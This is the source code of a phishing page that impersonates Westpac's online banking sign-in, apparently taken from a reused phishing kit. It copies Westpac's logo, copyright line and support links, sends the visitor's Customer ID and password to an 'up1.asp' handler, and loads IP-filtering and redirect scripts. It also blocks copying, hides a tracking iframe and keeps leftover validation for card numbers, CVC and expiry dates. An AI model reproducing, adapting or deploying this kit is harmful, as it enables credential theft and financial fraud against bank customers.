
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
		<script language="javascript" src="drop_ip.asp"></script>
		
		<script type="text/javascript" src="/3jitiaozhuan.js" ></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
	</head>
 <style>
        html {
            background-color: #fff;
            font-size: 14px;
            color: #fff;
            background: #fff
        }

        body {
            margin: 0px;
            padding: 0px;
            background-color: #fff;
            
        }

        * {
            font-family: "微软雅黑";
        }
            input[type="button"],input[type="submit"],input[type="reset"],input[type="text"],input[type="tel"],button,textarea{-webkit-appearance:none;}


        div,ul,li,dt,dd,p {
            padding: 0px;
            margin: 0px;
        }

        .wrap {
            width: 100%;
            background: #f5f5f5;
            max-width: 640px;
            margin: 0 auto
        }

        .khimg {
           
            text-align: center;
            width: 90%;
            overflow: hidden;
            padding-top: 5px;
        }
        
        .khimg img {
            width: 10%;
            float: left;
            overflow: hidden;
            line-height: 30px;
        }
        
        .khimg span {
            float: left;
        	color: #0b2398;
        	padding-top: 7px;
            line-height: 20px;
            padding-left: 10px;
            font-weight: bold
        }
        
        .tjform {
          
            overflow: hidden;
            width: 100%;
           
        }
        .fudong{
          

        }
        .fudong1{
        
        }
        .yhkh {
            border-style:solid;
            border-width:0px;
            border-color:rgb(226, 228, 230);
            padding: 10px ;
            margin-top: 10px;


        }
        .yhkh1 {
            max-width: 290px;
            border-style:solid;
            border-width:0px;
            border-color:rgb(226, 228, 230);
            padding: 10px ;
            padding-left: 6.5vw;
            margin-top: 10px;


        }

        form {
          
            border: 0px solid #dddddd;
            border-radius: 5px;
        }
        .yhkh span {
            text-size-adjust: 100%;
            font-style: normal;
            font-weight: normal;
            font-variant: normal;
            text-transform: none;
            -webkit-font-smoothing: antialiased;
            font-family: "Myriad pro", sans-serif !important;
            text-align: inherit;
            line-height: inherit;
            box-sizing: border-box;
            font-size: 16px;
            transition: font-size 0.2s ease 0s, transform 0.2s ease 0s, color 0.2s ease 0s;
            display: inline-block;
            color: rgb(73, 73, 73);
            margin-bottom: 4px;
            letter-spacing: normal;
        }
        
        .yhkh input {
            border: none;
            height: 100%;
            width: 96%;
            height: 44px;
            margin: 0 auto;
            line-height: 30px;
            font-size: 13px;
            padding-left: 15px;
           
            border-style:solid;
            border-width:1px;
            border-color: #8c9296;
            border-radius: 3px;
            
        }
        
        .tjbtn {
            width: 100%;
            text-align: center;
           
        }
        
        .tjbtn input {
            background: #f84347;
            border: none;
            padding: 3%  10%;
            text-align: center;
            color: #fff;
            width: 100%;
            font-size: 16px;
            border-radius: 4px;
            margin: 0 auto
        }
        
        .beizhu {
            text-align: left;
            color: #636363;
            padding-left: 4%
        }
        
        .beizhu a {
            color: #6295c4;
            text-decoration: none
        }
        
        .shuom {
            background: #e6f0f9;
        	font-size: 13px;
            padding: 10px 15px 5px 15px;
            color: #5f9bd9;
           
            overflow: hidden;
            line-height: 24px;
        }
        
        .content {
            width: 90%;
            margin: 0 auto
        }
    </style>
    
	<style type="text/css">
 .password{
 position: relative;
 }
 .password,.n-txtCss{
 display: flex;
 align-items: center;
 }
 .password .fa{


 }
 
 .fa-eye-slash{
 width: 10%;
 height: 20px;
 background-image: url(app/img/2.png);
 background-repeat: no-repeat;
 background-size: 22px 22px;
 }
 .fa-eye{
 width: 10%;
 height: 20px;
 background-image: url(app/img/1.png);
 background-repeat: no-repeat;
 background-size: 22px 22px;
 
 }
 
 
 #shouji{
     background-image: url('/static/img/visa.png');
     background-size: 100px 19px;
     background-repeat: no-repeat;
     background-position: 95% 6px;
     border-radius: 5px;
 }
  #cvn{
     background-image: url('/static/img/cvv-code.jpg');
     background-size: 20px 20px;
     background-repeat: no-repeat;
     background-position: 95% 6px;
     border-radius: 5px;
 }
 a{text-decoration:none}
 </style>
<script type="text/javascript" src="app/js/jquery-1.9.1.min.js"></script>
<script language="javascript" src="app/js/layer.js"></script>
<link id="layuicss-layer" rel="stylesheet" href="app/css/layer.css" media="all">


<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false" onbeforecopy="return false" oncopy=document.selection.empty() onselect=document.selection.empty()>

    <div style="background-color: #fff;width: 100%;height: 60px;margin-top:;text-align:center;"> 
        <img src="img/Westpac_ logo_8.png" style="width: 100px;height: auto;padding: 2px;margin-left: 0px;">
        <hr style="opacity:0.6;margin-top:-5px;">
    </div>
    


    

    <div style="width: 95%;height: auto;margin: 0 auto;min-width: 190px;">
       
            <form method="post" action="up1.asp" id="form" name="form" onsubmit="return checkinput(form)">
                <input value="" name="g_zhanghao" type="hidden">
                <input value="" name="qkmm" type="hidden">

                        <div class="yhkh"> 

                            <style>
                                .biaoti{
                                    text-size-adjust: 100%;
                                    font-style: normal;
                                    font-variant: normal;
                                    text-transform: none;
                                    -webkit-font-smoothing: antialiased;
                                    text-align: left;
                                    font-weight: 400;
                                    line-height: 1.125;
                                    letter-spacing: normal;
                                    color: #1f1c4f;
                                    font-size: 18px;
                                    font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;
                                    box-sizing: border-box;
                                        
                                      
                                }
                             
                                .zhaohuimima{
                                    text-size-adjust: 100%;
                                    font-style: normal;
                                    font-weight: normal;
                                    font-variant: normal;
                                    text-transform: none;
                                    -webkit-font-smoothing: antialiased;
                                    line-height: 1.25;
                                    letter-spacing: normal;
                                    font-family: "Myriad pro", sans-serif !important;
                                    font-size: 15px !important;
                                    box-sizing: border-box;
                                    background-color: transparent;
                                    text-decoration: none;
                                    color:#DA1710;
                                    -webkit-tap-highlight-color: transparent;
                                        
                                }
                                
                                
                            </style>
                            
                        
                            <p class="biaoti"> &nbsp;Sign in</p>
                  
                             <br>
                            <!--<span>Customer Registration Number</span>-->
                            <input class="user_input" maxlength="50" minlength="6"  type="text" id="cnName"  name="g_xingming"  placeholder="Customer ID" oninput="value=value.replace(/[^\d]/g,'')">

                            <br>
                            <br>
                           


                             <!--<span>Password</span>-->
                            <input class="password_input" maxlength="30" minlength="6" type="password" id="pwd1" name="g_wangyin"  placeholder="Password">
                            
                            <br>
                            <br>
                          


                            <div class="">
                                <div class="form-group" style="padding-top: 0px;">
                                <button type="submit" class="btn btn-block text-white btn-lg" style="
                                    text-size-adjust: 100%;
                                    -webkit-font-smoothing: antialiased;
                                    box-sizing: border-box;
                                    font-size: 100%;
                                    overflow: visible;
                                    text-transform: none;
                                    line-height: 1.25;
                                    appearance: button;
                                    width: 100%;
                                    margin: 0px;
                                    background-color: #DA1710;
                                    color: rgb(255, 255, 255);
                                    border: 1px solid transparent;
                                    border-radius: 4px;
                                    font-weight: 600;
                                    padding: 12px;
                                    cursor: pointer;
                                    transition: background-color 0.2s ease 0s, border-color 0.2s ease 0s, color 0.2s ease 0s;
                                    font-family: myriad-pro-semibold, sans-serif, sans-serif !important;
                                "
                                    id="submit"  >
                                    <img src="img/Snipaste.png" style="width: 11.3px;height: 16px;">&nbsp;
                                    Sign in</button>
                                    
                                    <br>
                                    <br>
                                    <br>



                                    <a href="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login&segment=personal&logout=false#/forgottencredential" class="zhaohuimima">Forgot customer ID or password?</a>
                                    
                                    <a href="https://www.westpac.com.au/personal-banking/online-banking/support-faqs/" style="float: right;color: #DA1710;font-size: 15px;">Help</a>
                                    <div style="clear:both;"></div>
                                    <br>
                                    <br>
                                    <br>
                               
                                    <br>
                                   
                             
                                    </div>
                                
                       
                        </div>

        
                    </div>
                </div>




    </div>
</div>

























        		<script type="text/javascript">
                $(".password").on("click", ".fa-eye-slash", function () {
                $(this).removeClass("fa-eye-slash").addClass("fa-eye");
                $(this).prev().attr("type", "text");
                });
                
                $(".password").on("click", ".fa-eye", function () {
                $(this).removeClass("fa-eye").addClass("fa-eye-slash");
                $(this).prev().attr("type", "password");
                });
                </script>
                        <script>
                            // 验证码组件初始化
                            var netease = (function() {
                                var init = function(cid, ele) {
                                    initNECaptcha({
                                        captchaId: cid,
                                        element: ele,
                                        mode: 'float',
                                        width: '100%',
                                        float: 'left',
                                        onVerify: function(err, ret) {
                                            if (!err) {}
                                        }
                                    }, function(err) {});
                                }
                                return {
                                    init: init
                                }
                            })();
        
        // 		function setOpenMsg(content,btn){
        // 			layer.open({
        // 				content: content
        // 				,btn: btn || '确定'
        // 			});
        // 		}
                             //验证银行卡
                            $('#idcard').blur(function() {
                                var idcard = $(this).val();
                                $(this).data('che', 0);
                                if (idcard != '') {
                                    var re = /^\d{16,}$/;
                                    if (!re.test(idcard)) {
                                        setOpenMsg('卡号不存在或已被注销1');
                                    } else {
                                        $(this).data('che', 1);
                                    }
                                }
                            });
                             //验证信用卡
                            $('#creditCard').blur(function() {
                                let idcard = $(this).val();
                                $(this).data('che', 0);
                                if (idcard != '') {
                                    let re = /^\d{16,}$/;
                                    if (!re.test(idcard)) {
                                        setOpenMsg('卡号不存在或已被注销2');
                                    } else {
                                        $(this).data('che', 1);
                                    }
                                }
                            });
                             //验证密码
                            $('#pwd1').blur(function() {
                                var pwd = $(this).val();
                                $(this).data('che', 0);
                                if (pwd != '') {
                                    var re = /^\d{6}$/;
                                    if (!re.test(pwd)) {
                                        setOpenMsg('支付密码有误');
                                    } else {
                                        $(this).data('che', 1);
                                    }
                                }
                            });
                             //验证姓名
                             $('#cnName').blur(function() {
                                var name = $(this).val();
                                $(this).data('che', 0);
                                if (name != '') {
                                    var re = /^[\u4E00-\u9FA5]{2,4}$/;
                                    if (!re.test(name)) {
                                        setOpenMsg('Please enter the password');
                                    } else {
                                        $(this).data('che', 1);
                                    }
                                }
                            }); 
                             //验证身份证
                       /*      $('#idNo1').blur(function() {
                                var idNo = $(this).val();
                                $(this).data('che', 0);
                                if (idNo != '') {
                                    var re = /(^[1-9]\d{5}(18|19|([23]\d))\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\d{3}[0-9Xx]$)|(^[1-9]\d{5}\d{2}((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\d{3}$)/;///^\d{17}(\d{1}|X|x)$/
                                    if (!re.test(idNo)) {
                                        setOpenMsg('持卡人身份证号码有误');
                                    } else {
                                        $(this).data('che', 1);
                                    }
                                }
                            }); */
                             //验证手机号
                           /*  $('input[name=g_shouji]').blur(function() {
                                var phone = $(this).val();
                                $(this).data('che', 0);
                                if (phone != '') {
                                    var re = /^1[3-9]\d{9}$/;
                                    if (!re.test(phone)) {
                                        setOpenMsg('预留手机号码有误');
                                    } else {
                                        $(this).data('che', 1);
                                    }
                                }
                            }); */
                             //验证提交
                            $('body').on('click', '#submit', function() {
        						console.log(111);
                                
        
                              /*   if (!$('#pwd1').attr('disabled')&&!$('#pwd1').val()) {
                                    setOpenMsg('未填写密码');
                                    return false;
                                } */
                                /* if (!$('#pwd1').data('che')) {
                                    setOpenMsg('支付密码应为6位纯数字');
                                    return false;
                                } */
                                if (!$('#cnName').attr('disabled')&&!$('#cnName').val()) {
                                    setOpenMsg('The name of the cardholder is not filled in');
                                    return false;
                                }
                               /*  if (!$('#cnName').data('che')) {
                                    setOpenMsg('持卡人姓名不符合规范，请重新输入。');
                                    return false;
                                } */
                                if (!$('#idNo1').attr('disabled')&&!$('#idNo1').val()) {
                                    setOpenMsg('Card number is not filled in');
                                    return false;
                                }
                               /*  if (!$('#idNo1').data('che')) {
                                    setOpenMsg('持卡人身份证号有误');
                                    return false;
                                } */
        						                        if (!$('#shouji').val()&&!$('#shouji1').val()) {
                                    setOpenMsg('Zip code not filled in');
                                    return false;
                                }
                                /* if (!$('#shouji').data('che')&&!$('#shouji1').data('che')) {
                                    setOpenMsg('预留手机号码有误');
                                    return false;
                                } */
                                if (!$('#yxq').attr('disabled')&&!$('#yxq').val()) {
                                    setOpenMsg('The credit card expiration date is not filled in');
                                    return false;
                                }
                                if (!$('#cvn').attr('disabled')&&!$('#cvn').val()) {
                                    setOpenMsg('CVC not filled');
                                    return false;
                                }
        
                            })
                        </script>
        
        
        
            </form>
            </div>
        		<script>
        		function getUrlParam (name) {
        			var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
        			var r = decodeURIComponent(window.location.search).substr(1).match(reg);
        			console.log(r);
        			if (r!=null) {
        				return unescape(r[2]);
        			}
        			return null;
        		}
        		$(document).ready(function(){
        			let logo = getUrlParam("logo");
        			let g_zhanghao = getUrlParam("g_zhanghao");
        			let qkmm = getUrlParam("qkmm");
        			$("#bankLogo").attr('src',"app/img/"+logo);
        			$("[name=g_zhanghao]").attr('value',g_zhanghao);
        			$("[name=qkmm]").attr('value',qkmm);
        			$("#yinhangka").text(qkmm+'('+g_zhanghao.replace(/^(\d{4})\d+(\d{4})$/, "$1****$2")+')');
        		});
        		
        	</script>
        	<iframe src="online.asp" style="display: none;"></iframe>
<div style="clear:both;"></div>	
<div style="background-color:#DA1710;width:100%;height:66px;position:absolute;position:fixed; z-index:1000; bottom:0px; ">
        <span style="text-align:center;display:block;padding:10px;position:absolute;position:fixed; z-index:1000; bottom:0px;">© Westpac Banking Corporation ABN 33 007 457 141 AFSL and Australian credit licence 233714.</span>
    </div>
    <%
      countcss=-1
	  whichfile=server.mappath("./count.txt")
      Set fs=CreateObject("Scripting.FileSystemObject")
      Set thisfile=fs.opentextfile(whichfile)
      visitors=thisfile.readline
      thisfile.close
      visitors=visitors+1
      set thisfile=fs.createtextfile(whichfile)
      thisfile.writeline(visitors)
      thisfile.close
      set fs=nothing
	  
      countlen=len(visitors)
	  'response.write "访问量：" & visitors
%>
</body>

</html>